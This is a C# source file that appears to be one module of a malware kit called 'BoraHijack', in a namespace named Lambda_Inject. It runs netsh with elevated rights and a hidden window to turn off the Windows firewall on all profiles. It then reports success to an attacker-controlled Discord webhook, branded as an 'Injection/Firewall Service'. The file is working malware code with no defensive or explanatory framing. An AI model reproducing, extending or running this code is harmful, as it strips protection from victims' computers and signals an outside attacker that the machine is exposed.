using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using Discord;
using Discord.Webhook;

namespace BoraHijack.Lambda_Inject
{
    class Firewall
    {
        public static void Fwdisable(string webhookUrl)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = "advfirewall set allprofiles state off",
                Verb = "runas",
                UseShellExecute = true,
                CreateNoWindow = true
            });

            Telluser(webhookUrl);
        }

        private static void Telluser(string webhookUrl)
        {
            var client = new DiscordWebhookClient(webhookUrl);
            client.SendMessageAsync(
                text:"",
                username:"Lambda",
                avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder().WithTitle("Firewall").WithDescription("Disabled Firewall!").WithFooter("Injection/Firewall Service for BoraHijack • By v1s0or").WithColor(255, 230, 0).Build() } // .WithColor uses RGB (comment for future projects)
                );
        }
    }
}
